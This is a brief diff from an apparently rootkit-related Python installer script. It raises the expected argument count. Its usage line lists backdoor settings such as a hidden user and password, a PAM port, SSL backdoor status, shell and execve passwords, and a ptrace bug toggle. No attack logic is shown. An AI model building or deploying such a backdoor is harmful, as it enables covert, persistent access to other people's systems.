@@ -6,7 +6,7 @@ import random
 import string
 import crypt
 
-if len(sys.argv) != 15:
+if len(sys.argv) != 16:
     print "Why are you running me from the command line?"
     print "Usage: {0} <install> <lib name> <xattr 1> <xattr 2> <username> <plaintext password> <pam port> <ssl backdoor status> <accept shell password> <low> <high> <execve password> <environ var> <ptrace bug status>".format(sys.argv[0])
     quit()
